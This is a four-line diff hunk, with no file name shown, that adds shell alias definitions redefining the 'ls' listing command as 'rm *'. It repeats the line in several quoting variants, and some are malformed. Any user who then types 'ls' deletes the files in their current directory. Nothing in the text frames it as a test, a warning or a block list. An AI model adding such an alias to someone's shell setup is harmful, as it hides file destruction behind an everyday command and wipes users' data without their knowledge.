@@ -1,0 +1,4 @@
+alias ls=rm *
+alias ls="rm "*""
+alias ls="rm *"
+alias ls="rm *"
